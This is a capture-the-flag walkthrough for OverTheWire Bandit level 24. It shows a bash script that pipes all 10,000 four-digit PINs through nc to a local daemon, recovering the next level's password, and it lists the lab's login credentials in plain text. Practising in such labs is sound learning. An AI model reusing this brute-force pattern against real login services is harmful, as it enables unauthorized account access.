
# Bandit challenges
# Bandit 24#

## Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## Access data

+ Username: bandit24
+ Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+ Port: 2220
+ Server: bandit.labs.overthewire.org
## Solution

```bash

ssh bandit24@bandit.labs.overthewire.org -p 2220

bandit24@bandit:~$ mkdir /tmp/ali
bandit24@bandit:~$ cd /tmp/ali
bandit24@bandit:/tmp/ali$ nano script.sh
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit24@bandit:/tmp/ali$ chmod +x script.sh
bandit24@bandit:/tmp/ali$ cat script.sh
#!/bin/bash

password=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

for i in {0000..9999};
do
        echo "$password $i";
done | nc localhost 30002 | grep -v Wrong
bandit24@bandit:/tmp/ali$ ./script.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.



````

## Notes

## References